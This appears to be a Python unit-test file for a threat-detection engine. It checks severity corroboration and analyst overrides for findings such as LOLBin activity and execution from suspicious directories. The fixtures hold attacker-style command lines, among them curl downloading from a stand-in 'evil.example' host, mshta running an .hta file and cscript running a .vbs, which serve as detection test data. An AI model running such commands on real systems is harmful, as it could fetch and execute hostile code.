from __future__ import annotations

# ruff: noqa: E402
#
# Coverage for the conservative-severity + corroboration model and the user
# override controls (mark-benign / disable-rule):
#   * two independent low findings on the same entity escalate to medium;
#   * marking a finding benign forces it to info and it stays info across a rebuild;
#   * disabling a rule forces every finding of that rule to info; re-enabling restores
#     the engine-produced severity.

import sys
import tempfile
import types
import unittest
from pathlib import Path
from unittest.mock import patch


class _BaseModel:
    def __init__(self, **kwargs):
        for key, value in kwargs.items():
            setattr(self, key, value)

    @classmethod
    def model_validate(cls, data):
        return cls(**data)

    def model_dump_json(self, indent=None):
        return "{}"


sys.modules.setdefault("keyring", types.SimpleNamespace(
    get_password=lambda *_a, **_k: None,
    set_password=lambda *_a, **_k: None,
    delete_password=lambda *_a, **_k: None,
    errors=types.SimpleNamespace(PasswordDeleteError=Exception),
))
sys.modules.setdefault("pydantic", types.SimpleNamespace(
    BaseModel=_BaseModel,
    Field=lambda default=None, default_factory=None, **_k: default_factory() if default_factory else default,
))

from sqlalchemy import select
from app.detect import engine, overrides
from app.store import cases
from app.store import database
from app.store.database import Finding, Process


class _Base(unittest.TestCase):
    def setUp(self) -> None:
        self.tmp = tempfile.TemporaryDirectory()
        self.root = Path(self.tmp.name)
        self.patches = [
            patch.object(cases, "get_cases_dir", return_value=self.root),
            patch.object(cases, "case_db_path", side_effect=lambda cid: self.root / cid / "case.db"),
        ]
        for p in self.patches:
            p.start()
        self.case = cases.create_case("ov")
        self.cid = self.case["id"]

    def tearDown(self) -> None:
        database.dispose_all_db_engines()
        for p in reversed(self.patches):
            p.stop()
        self.tmp.cleanup()

    def _session(self):
        return cases.get_session(self.cid)

    def _findings(self):
        s = self._session()
        try:
            return {(f.title, f.severity) for f in s.scalars(select(Finding))}
        finally:
            s.close()


class CorroborationTests(_Base):
    def test_two_low_findings_on_same_entity_escalate_to_medium(self) -> None:
        # A single process that (a) is a LOLBin invocation with args -> low, and
        # (b) runs from a staging dir -> low. Two independent low rules on the
        # same entity should corroborate up to medium.
        s = self._session()
        try:
            s.add(Process(
                pid=4321, ppid=None, name="curl.exe",
                path=r"C:\Users\v\AppData\Local\Temp\curl.exe",
                cmdline="curl.exe https://evil.example/x -o x", session_id="live",
                flags=[], severity="info",
            ))
            s.commit()
        finally:
            s.close()
        engine.run_detections_sync(self.cid)

        by_title = {t: sev for t, sev in self._findings()}
        self.assertEqual(by_title.get("LOLBin activity: curl.exe"), "medium")
        self.assertEqual(by_title.get("Execution from suspicious directory: curl.exe"), "medium")

    def test_corroboration_is_idempotent_across_reruns(self) -> None:
        # The ingest/memory pipelines re-run detections without wiping findings;
        # re-running must not compound the escalation (low+low -> medium, forever).
        s = self._session()
        try:
            s.add(Process(
                pid=4321, ppid=None, name="curl.exe",
                path=r"C:\Users\v\AppData\Local\Temp\curl.exe",
                cmdline="curl.exe https://evil.example/x -o x", session_id="live",
                flags=[], severity="info",
            ))
            s.commit()
        finally:
            s.close()
        engine.run_detections_sync(self.cid)
        engine.run_detections_sync(self.cid)
        engine.run_detections_sync(self.cid)
        by_title = {t: sev for t, sev in self._findings()}
        self.assertEqual(by_title.get("LOLBin activity: curl.exe"), "medium")
        self.assertEqual(by_title.get("Execution from suspicious directory: curl.exe"), "medium")

    def test_lone_low_finding_stays_low(self) -> None:
        s = self._session()
        try:
            # Only the suspicious-dir rule fires (a plain exe, not a LOLBin).
            s.add(Process(
                pid=99, ppid=None, name="tool.exe",
                path=r"C:\Users\v\AppData\Local\Temp\tool.exe",
                cmdline="tool.exe", session_id="live", flags=[], severity="info",
            ))
            s.commit()
        finally:
            s.close()
        engine.run_detections_sync(self.cid)
        by_title = {t: sev for t, sev in self._findings()}
        self.assertEqual(by_title.get("Execution from suspicious directory: tool.exe"), "low")


class OverrideTests(_Base):
    def _seed_two_lolbins(self) -> None:
        s = self._session()
        try:
            s.add(Process(
                pid=10, ppid=None, name="mshta.exe", path=r"C:\Windows\System32\mshta.exe",
                cmdline="mshta.exe C:\\x\\a.hta", session_id="live", flags=[], severity="info",
            ))
            s.add(Process(
                pid=11, ppid=None, name="cscript.exe", path=r"C:\Windows\System32\cscript.exe",
                cmdline="cscript.exe C:\\x\\b.vbs", session_id="live", flags=[], severity="info",
            ))
            s.commit()
        finally:
            s.close()
        engine.run_detections_sync(self.cid)

    def test_disable_rule_forces_all_to_info_and_reenable_restores(self) -> None:
        self._seed_two_lolbins()
        # Both LOLBin findings start at medium.
        self.assertEqual(
            {sev for t, sev in self._findings() if t.startswith("LOLBin activity")},
            {"medium"},
        )
        # Disable the lolbin-activity rule.
        s = self._session()
        try:
            overrides.set_rule_disabled(s, "lolbin-activity", True)
            overrides.apply_overrides(s)
            s.commit()
        finally:
            s.close()
        self.assertEqual(
            {sev for t, sev in self._findings() if t.startswith("LOLBin activity")},
            {"info"},
        )
        # Survives a full rebuild (findings wiped + regenerated).
        engine.run_detections_sync(self.cid)
        self.assertEqual(
            {sev for t, sev in self._findings() if t.startswith("LOLBin activity")},
            {"info"},
        )
        # Re-enable -> engine-produced severity comes back.
        s = self._session()
        try:
            overrides.set_rule_disabled(s, "lolbin-activity", False)
            overrides.apply_overrides(s)
            s.commit()
        finally:
            s.close()
        self.assertEqual(
            {sev for t, sev in self._findings() if t.startswith("LOLBin activity")},
            {"medium"},
        )

    def test_mark_benign_forces_info_and_survives_rebuild(self) -> None:
        self._seed_two_lolbins()
        s = self._session()
        try:
            f = s.scalars(select(Finding).where(Finding.title == "LOLBin activity: mshta.exe")).one()
            key = overrides.finding_key(f.title, f.evidence)
            overrides.set_finding_benign(s, key, True)
            overrides.apply_overrides(s)
            s.commit()
        finally:
            s.close()
        by_title = {t: sev for t, sev in self._findings()}
        self.assertEqual(by_title.get("LOLBin activity: mshta.exe"), "info")
        # The other finding is untouched.
        self.assertEqual(by_title.get("LOLBin activity: cscript.exe"), "medium")
        # Benign mark persists across a rebuild (keyed by stable identity).
        engine.run_detections_sync(self.cid)
        by_title = {t: sev for t, sev in self._findings()}
        self.assertEqual(by_title.get("LOLBin activity: mshta.exe"), "info")

    def test_rule_id_families(self) -> None:
        self.assertEqual(overrides.rule_id_for("LOLBin activity: msiexec.exe", ""), "lolbin-activity")
        self.assertEqual(overrides.rule_id_for("LOLBin activity: curl.exe", ""), "lolbin-activity")
        self.assertEqual(overrides.rule_id_for("Web attack: sqlmap scanner user-agent", ""),
                         "web-sqlmap-scanner-user-agent")
        self.assertEqual(overrides.rule_id_for("Golden ticket attack", ""), "golden-ticket-attack")
        self.assertEqual(overrides.rule_id_for("New service installed", ""), "new-service-installed")


if __name__ == "__main__":
    unittest.main()
